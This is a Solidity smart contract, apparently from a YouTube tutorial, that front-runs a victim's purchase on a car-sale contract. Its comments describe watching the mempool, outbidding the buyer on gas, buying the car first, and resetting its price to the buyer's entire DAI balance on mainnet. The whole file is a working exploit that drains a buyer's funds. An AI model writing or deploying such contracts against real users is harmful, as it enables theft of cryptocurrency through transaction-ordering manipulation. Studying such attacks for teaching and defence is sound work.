//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
// Example from Alberto Lasa youtube channel
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVICTIM{
        function s_price() external returns(uint256);
        function setPrice(uint256 p_price) external;
        function buy(address p_newOwner) external;
}

contract exampleHack2{
    address hacker;
    address VICTIM_ADDRESS;
    address DAI_ADDRESS=0x6b175473e89094cc4da98b954eedeAC495271d0F; //Contrato dai en mainnet

    constructor(address p_victim_address){
        hacker=msg.sender;
        VICTIM_ADDRESS=p_victim_address;
    }

    //This function must be sended to mempool when a victim buyer try to buy the car, then:
    //
    //1. Inyect this function in the mempool with more gas (Frontrunning)
    //2. Buy the car to current price
    //3. Get victim buyer balance
    //4. Sale to the victim buyer with a price equals to total funds of the victim.
    function hack(address p_buyer) public{ 
        require(msg.sender==hacker);
        IVICTIM(VICTIM_ADDRESS).buy(hacker);
        uint256 allBalanceBuyer=IERC20(DAI_ADDRESS).balanceOf(p_buyer);
        IVICTIM(VICTIM_ADDRESS).setPrice(allBalanceBuyer);
    }
}
